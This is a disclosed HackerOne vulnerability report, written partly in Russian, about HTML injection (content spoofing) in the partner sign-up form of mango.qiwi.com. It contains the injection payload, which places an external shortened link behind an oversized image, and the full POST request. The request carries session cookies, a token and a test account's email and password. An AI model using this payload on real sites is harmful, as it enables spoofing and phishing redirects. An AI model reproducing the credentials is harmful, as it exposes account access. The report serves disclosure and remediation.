---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '118066'
original_report_id: '118066'
title: Content Spoofing in mango.qiwi.com
weakness: Improper Authentication - Generic
team_handle: qiwi
created_at: '2016-02-23T01:36:17.053Z'
disclosed_at: '2017-04-06T23:35:57.390Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- improper-authentication-generic
---

# Content Spoofing in mango.qiwi.com

## Metadata

- HackerOne Report ID: 118066
- Weakness: Improper Authentication - Generic
- Program: qiwi
- Disclosed At: 2017-04-06T23:35:57.390Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Доброй ночи.

Уязвимость найдена по адресу:
https://mango.qiwi.com/partner/dashboard

Уязвимый параметр: ` partner[first_name] `

Exploit Code: ` <a%20href=//vk.cc/4P0UsU><img%20src=x%20width=10000></a> `

POST Запрос: 
>
POST /partner/signup HTTP/1.1
Host: mango.qiwi.com
Connection: keep-alive
Content-Length: 515
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://mango.qiwi.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36 OPR/35.0.2066.68
Content-Type: application/x-www-form-urlencoded
Referer: https://mango.qiwi.com/partner/signup
Accept-Encoding: gzip, deflate, lzma
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: _ga_cid=628369546.1423344338; _ga_info=2|4|1455497727000|false|; skip_ie8_validation=N; _felix_session_id=47705e9a1e953929779e1cae45d0ca61; mango-pre-validate=Y; GA-enabled=T; __utma=85752325.628369546.1423344338.1456174843.1456174843.1; __utmc=85752325; __utmz=85752325.1456174843.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); request_method=GET; __distillery=v20150227_4295d2de-80ce-46d3-8bd1-27a62225a2b8; _gat=1; _ga=GA1.2.628369546.1423344338

**POST Данные**

>
utf8=%E2%9C%93&authenticity_token=0lA5UH%2Fbr0GxFTp%2BsKhNEsU%2Bbh4521Wi%2FAoJwxYU79E%3D&partner%5Bcompany_name%5D=Negrosoft&**partner%5Bfirst_name%5D=<a%20href=//vk.cc/4P0UsU><img%20src=x%20width=10000></a>**
&partner%5Blast_name%5D=Ololo&partner%5Bemail%5D=plex_mobile%40inbox.ru&partner%5Bmango_user%5D=1&partner%5Buse_of_mangoapps%5D=I+don%27t+know+%29&partner%5Bcompany_services%5D=I%27m+register&partner%5Bcompany_size%5D=1-10&partner%5Bcountry%5D=RU&partner%5Bterms_of_service%5D=0&partner%5Bterms_of_service%5D=1



##PoC##
Для воспроизведения
авторизоваться с этими данными: 
Email: `plex_mobile@inbox.ru`
Password: `1qaz2wsx3edc`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
